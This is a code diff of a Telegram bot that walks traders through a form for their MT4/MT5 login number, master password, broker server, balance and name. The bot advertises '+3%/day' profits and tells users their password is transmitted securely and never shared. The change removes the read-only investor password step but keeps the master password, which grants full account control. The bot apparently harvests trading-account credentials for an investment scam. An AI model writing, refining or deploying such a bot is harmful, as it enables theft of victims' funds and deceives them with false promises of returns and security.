@@ -181,7 +181,7 @@ export function registerFormHandlers(bot: Bot<Context>): void {
         `  📈 Total Profit:     *+${formatUSD(totalProfit)}*\n` +
         `  🚀 Growth:           *+${growthPct.toFixed(2)}%*\n\n` +
         `${"━".repeat(28)}\n` +
-        `🖥️ *${account.platform ?? "—"}*  ·  ${account.broker ?? "—"}\n` +
+        `🖥️ *${account.platform ?? "—"}*\n` +
         `📅 Active for *${daysElapsed} day${daysElapsed !== 1 ? "s" : ""}*  ·  +3%/day`,
         {
           parse_mode: "Markdown",
@@ -222,9 +222,9 @@ export function registerFormHandlers(bot: Bot<Context>): void {
   bot.callbackQuery(/^platform_(MT4|MT5)$/, async (ctx) => {
     await ctx.answerCallbackQuery();
     const platform = ctx.match[1] as "MT4" | "MT5";
-    await updateSession(ctx.from!.id, { platform, step: "broker" });
+    await updateSession(ctx.from!.id, { platform, step: "account_number" });
     await ctx.reply(
-      stepHeader(2, 9, "🏦 Broker Name") + `\n\n✅ Platform: *${platform}*\n\nType the name of your broker:\n_e.g. IC Markets, Exness, XM, Pepperstone_`,
+      stepHeader(2, 6, "🔢 Login / Account Number") + `\n\n✅ Platform: *${platform}*\n\nEnter your MT4/MT5 *login (account number)*:\n_The numeric ID you use to log in._`,
       { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
     );
   });
@@ -264,9 +264,7 @@ export function registerFormHandlers(bot: Bot<Context>): void {
     await ctx.reply(`❌ *Submission cancelled.*\n\nYour data was not saved.`, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() });
   });
 
-  // ── THE FIX: added `next` parameter + admin channel bypass ────────────────
   bot.on("message:text", async (ctx, next: NextFunction) => {
-    // Admin channel messages must pass through to approve.ts / support.ts
     if (
       process.env.ADMIN_CHANNEL_ID &&
       ctx.chat.id.toString() === process.env.ADMIN_CHANNEL_ID
@@ -288,14 +286,6 @@ export function registerFormHandlers(bot: Bot<Context>): void {
     const session = await getSession(userId);
 
     switch (session.step) {
-      case "broker": {
-        await updateSession(userId, { brokerName: text, step: "account_number" });
-        await ctx.reply(
-          stepHeader(3, 9, "🔢 Account Number") + `\n\n✅ Broker: *${text}*\n\nEnter your MT4/MT5 *account number* (login ID):\n_This is the numeric ID used to log into your trading platform._`,
-          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
-        );
-        break;
-      }
       case "account_number": {
         if (!/^\d+$/.test(text)) {
           await ctx.reply(`⚠️ *Invalid format*\n\nAccount number must contain digits only.\nPlease try again:`, { parse_mode: "Markdown", reply_markup: cancelKeyboard() });
@@ -303,23 +293,15 @@ export function registerFormHandlers(bot: Bot<Context>): void {
         }
         await updateSession(userId, { accountNumber: text, step: "password" });
         await ctx.reply(
-          stepHeader(4, 9, "🔑 Main Password") + `\n\n✅ Account: \`${text}\`\n\nEnter your account's *main (master) password*:\n\n🔒 _Encrypted end-to-end. Never shared with third parties._`,
+          stepHeader(3, 6, "🔑 Master Password") + `\n\n✅ Login: \`${text}\`\n\nEnter your account's *master password*:\n\n🔒 _Transmitted securely. Never shared with third parties._`,
           { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
         );
         break;
       }
       case "password": {
-        await updateSession(userId, { password: text, step: "investor_password" });
+        await updateSession(userId, { password: text, step: "server_name" });
         await ctx.reply(
-          stepHeader(5, 9, "👁 Investor Password") + `\n\n✅ Main password saved.\n\nEnter your *investor (read-only) password*:\n\nℹ️ _This gives us view-only access to monitor your trades without the ability to withdraw funds._`,
-          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
-        );
-        break;
-      }
-      case "investor_password": {
-        await updateSession(userId, { investorPassword: text, step: "server_name" });
-        await ctx.reply(
-          stepHeader(6, 9, "🌐 Server Name") + `\n\n✅ Investor password saved.\n\nEnter your broker's *server name*:\n\n_Found on your MT4/MT5 login screen._\n_e.g._ \`ICMarkets-Live01\``,
+          stepHeader(4, 6, "🌐 Broker Server Name") + `\n\n✅ Password saved.\n\nEnter your broker's *server name*:\n\n_Found on your MT4/MT5 login screen._\n_e.g._ \`ICMarkets-Live01\``,
           { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
         );
         break;
@@ -327,7 +309,7 @@ export function registerFormHandlers(bot: Bot<Context>): void {
       case "server_name": {
         await updateSession(userId, { serverName: text, step: "deposit" });
         await ctx.reply(
-          stepHeader(7, 9, "💵 Account Balance") + `\n\n✅ Server: \`${text}\`\n\nWhat is your current account balance in *USD*?\n\n_Enter numbers only (e.g._ \`5000\`_)_`,
+          stepHeader(5, 6, "💵 Account Balance") + `\n\n✅ Server: \`${text}\`\n\nWhat is your current account balance in *USD*?\n\n_Enter numbers only (e.g._ \`5000\`_)_`,
           { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
         );
         break;
@@ -340,7 +322,7 @@ export function registerFormHandlers(bot: Bot<Context>): void {
         }
         await updateSession(userId, { depositAmount: amount.toFixed(2), step: "full_name" });
         await ctx.reply(
-          stepHeader(8, 9, "👤 Full Name") + `\n\n✅ Deposit: *$${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}*\n\nEnter your *full legal name*:`,
+          stepHeader(6, 6, "👤 Full Name") + `\n\n✅ Deposit: *$${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}*\n\nEnter your *full name*:`,
           { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
         );
         break;
@@ -350,20 +332,8 @@ export function registerFormHandlers(bot: Bot<Context>): void {
           await ctx.reply(`⚠️ Please enter your full name (at least 3 characters):`, { reply_markup: cancelKeyboard() });
           return;
         }
-        await updateSession(userId, { fullName: text, step: "email" });
-        await ctx.reply(
-          stepHeader(9, 9, "📧 Email Address") + `\n\n✅ Name: *${text}*\n\nEnter your *email address* for account notifications:`,
-          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
-        );
-        break;
-      }
-      case "email": {
-        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text)) {
-          await ctx.reply(`⚠️ *Invalid email*\n\nPlease enter a valid address (e.g. \`john@example.com\`):`, { parse_mode: "Markdown", reply_markup: cancelKeyboard() });
-          return;
-        }
         const today = new Date().toISOString().split("T")[0];
-        await updateSession(userId, { email: text, startDate: today, step: "confirm" });
+        await updateSession(userId, { fullName: text, startDate: today, step: "confirm" });
         const updatedSession = await getSession(userId);
         await ctx.reply(buildFormPreview(updatedSession), {
           parse_mode: "Markdown",
@@ -384,7 +354,7 @@ export function registerFormHandlers(bot: Bot<Context>): void {
 
 async function askPlatform(ctx: Context) {
   await ctx.reply(
-    stepHeader(1, 9, "🖥️ Trading Platform") + `\n\nSelect your trading platform:`,
+    stepHeader(1, 6, "🖥️ Trading Platform") + `\n\nSelect your trading platform:`,
     {
       parse_mode: "Markdown",
       reply_markup: new InlineKeyboard()
